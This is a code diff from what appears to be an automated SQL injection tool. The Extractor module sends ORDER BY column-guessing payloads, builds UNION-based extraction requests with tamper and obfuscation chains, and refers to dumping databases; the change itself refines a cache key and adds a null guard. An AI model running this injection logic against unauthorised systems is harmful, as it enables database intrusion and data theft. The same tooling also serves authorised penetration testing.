@@ -16,7 +16,7 @@
 // =====================================================================
 import { nullSequence } from './payloads.js';
 import { discoverEchoColumns, buildInjectionRequest } from './injection.js';
-import { binaryGuessColumns } from './columnGuess.js';
+import { binaryGuessColumns, colGuessExtra } from './columnGuess.js';
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
 // [P0-FIX 2026-09-09] 出口选项同源（delay/reqRate/maxReq/cookieJar 等必须在提取阶段也生效）
 import { buildEgressOpts } from './egressOpts.js';
@@ -151,7 +151,7 @@ export class Extractor {
         const res = await this._send(ctx, `${orig} ORDER BY ${n}-- -`);
         return res || null;
       },
-      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(ctx.target, ctx.point?.id), fixed: unionCols }
+      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(ctx.target, ctx.point?.id, colGuessExtra(ctx, ctx.point?.boundary || '')), fixed: unionCols }
     );
   }
 
@@ -218,6 +218,10 @@ export class Extractor {
     //   error/boolean-only 注入点无该字段 → 原样回落（零回归）。
     const confirmed = Number.isInteger(point?.columns) && point.columns > 0 ? point.columns : null;
     if (confirmed) columns = confirmed;
+    // [2026-10-01] 猜列 capped → null（判据失效，见 columnGuess）：无确认列数时 UNION 通道
+    // 不可用 —— 直接返回 null（所有调用方本就把 null 当「提取失败」降级处理），
+    // 不再拿荒谬列数发空转的 UNION 请求。
+    if (!Number.isInteger(columns) || columns <= 0) return null;
     const nulls = nullSequence(columns).split(',');
     // 优先复用检测阶段已识别的回显列；未识别（如 error 型注入）则现场探测，
     // 不再硬编第 2 列，回显列非 2 也能正确拖库。
@@ -874,11 +878,14 @@ export default Extractor;
 export const _colGuessCache = new Map();
 
 /**
- * 生成带目标作用域的猜列缓存 key：`${baseUrl}|${pointId}`。
+ * 生成带目标作用域的猜列缓存 key：`${baseUrl}|${pointId}|${extra}`。
+ * extra 由调用方给 colGuessExtra(ctx, boundary) —— 请求形态维度（闭合符/tamper 链/混淆），
+ * 防 A 形态下猜出的列数被 B 形态的扫描复用。
  * @param {object|null} target 扫描目标（取其 baseUrl 做作用域隔离）
  * @param {string|undefined} pointId 注入点 id
+ * @param {string} [extra] 请求形态维度（见 colGuessExtra）
  */
-export function colGuessScopeKey(target, pointId) {
+export function colGuessScopeKey(target, pointId, extra = '') {
   const scope = target && typeof target.baseUrl === 'string' ? target.baseUrl : '';
-  return `${scope}|${pointId ?? ''}`;
+  return `${scope}|${pointId ?? ''}|${extra}`;
 }
